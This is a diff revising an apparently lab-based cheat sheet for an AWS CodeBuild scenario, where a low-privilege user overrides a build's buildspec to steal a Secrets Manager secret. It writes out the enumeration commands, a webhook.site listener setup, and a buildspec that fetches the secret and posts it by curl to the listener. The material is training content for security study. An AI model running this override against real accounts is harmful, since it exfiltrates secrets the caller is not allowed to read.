@@ -1,4 +1,4 @@
-# Cheat Sheet — codebuild_secrets_exfil
+# Cheat Sheet - codebuild_buildspec_override_and_privesc_service_role
 
 ## Setup
 
@@ -20,7 +20,7 @@ Note the project name — it will look like `cg-vulnerable-project-<cgid>`.
 
 ---
 
-## Step 2 — Inspect the Project (Optional but Informative)
+## Step 2 — Inspect the Project
 
 ```bash
 aws codebuild batch-get-projects \
@@ -28,7 +28,8 @@ aws codebuild batch-get-projects \
   --profile bob
 ```
 
-Observe the `serviceRole` ARN in the output. This confirms the project runs with a privileged role.
+Check environment.environmentVariables; there should be a variable with the fields `NAME`, `value`, and `type`, where `type` should be SECRETS_MANAGER. 
+Note down the `value`, its name of secret, which have to use in step4
 
 ---
 
@@ -37,14 +38,11 @@ Observe the `serviceRole` ARN in the output. This confirms the project runs with
 On your attacker machine, start a simple HTTP listener to receive the exfiltrated secret:
 
 ```bash
-# Option A — Python one-liner
-python3 -m http.server 4444
-
-# Option B — Use a public endpoint service such as https://webhook.site
+# Use a public endpoint service such as https://webhook.site
 # Copy the unique URL it gives you
 ```
 
-Make note of your listener URL, e.g. `http://<your-public-ip>:4444` or the webhook.site URL.
+Make note of your listener URL, the webhook.site URL.
 
 ---
 
@@ -60,12 +58,13 @@ version: 0.2
 phases:
   build:
     commands:
-      - SECRET_NAME=$(aws secretsmanager list-secrets --query "SecretList[0].Name" --output text)
       - VALUE=$(aws secretsmanager get-secret-value --secret-id "$SECRET_NAME" --query "SecretString" --output text)
       - curl -s -X POST "<listener-url>" -H "Content-Type: application/json" -d "$VALUE"
 ' \
   --profile bob
 ```
+
+Note that `$SECRET_NAME` is not defined anywhere in this override. It is inherited automatically, because CodeBuild injects the project's own environment variables (the one you found in Step 2) into the build container regardless of any `buildspecOverride`.
 
 Note the `id` returned in the response — you can use it to track the build.
 
@@ -98,4 +97,4 @@ Example output at listener:
 
 ## Key Vulnerability
 
-`codebuild:StartBuild` accepts a `buildspecOverride` parameter that completely replaces the project's configured buildspec at runtime. There is no restriction preventing a caller from injecting arbitrary shell commands. Combined with a service role that holds `secretsmanager:GetSecretValue` on `*`, any identity that can start a build can effectively exfiltrate any secret in the account — even without holding Secrets Manager permissions themselves.
+`codebuild:BatchGetProjects` returns a project's plaintext environment variables, which here discloses the exact name of the target secret. `codebuild:StartBuild` separately accepts a `buildspecOverride` parameter that completely replaces the project's configured buildspec at runtime, while still injecting the project's own environment variables into the build. Combined with a service role that holds `secretsmanager:GetSecretValue` on `*`, an identity holding nothing more than `ListProjects`, `BatchGetProjects`, and `StartBuild` can exfiltrate the secret without ever holding Secrets Manager permissions itself.
